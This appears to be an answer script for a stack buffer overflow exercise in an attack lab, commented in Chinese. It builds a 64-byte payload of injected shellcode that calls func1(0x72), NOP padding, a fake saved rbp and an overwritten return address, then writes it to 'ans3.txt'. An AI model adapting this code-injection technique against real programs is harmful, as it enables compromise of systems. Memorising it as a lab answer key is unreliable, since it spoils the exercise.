# Shellcode: 调用 func1(0x72) 来输出 "Your lucky number is 114"
shellcode = b"\xbf\x72\x00\x00\x00"  # mov $0x72, %edi
shellcode += b"\xb8\x16\x12\x40\x00"  # mov $0x401216, %eax
shellcode += b"\xff\xe0"              # jmp *%rax
# 共12字节

# Payload布局:
# 字节 0-11:  shellcode (12字节)
# 字节 12-31: NOP填充 (20字节)
# 字节 32-39: 假的 saved rbp (8字节)
# 字节 40-47: 返回地址 = 缓冲区地址 0x7fffffffd820

padding = b"\x90" * 20  # NOP sled
fake_rbp = b"B" * 8     # 假的saved rbp
buffer_addr = b"\x20\xd8\xff\xff\xff\x7f\x00\x00"  # 0x7fffffffd820 小端序

payload = shellcode + padding + fake_rbp + buffer_addr
extra_padding = b"\x00" * (64 - len(payload))
payload += extra_padding

with open("ans3.txt", "wb") as f:
    f.write(payload)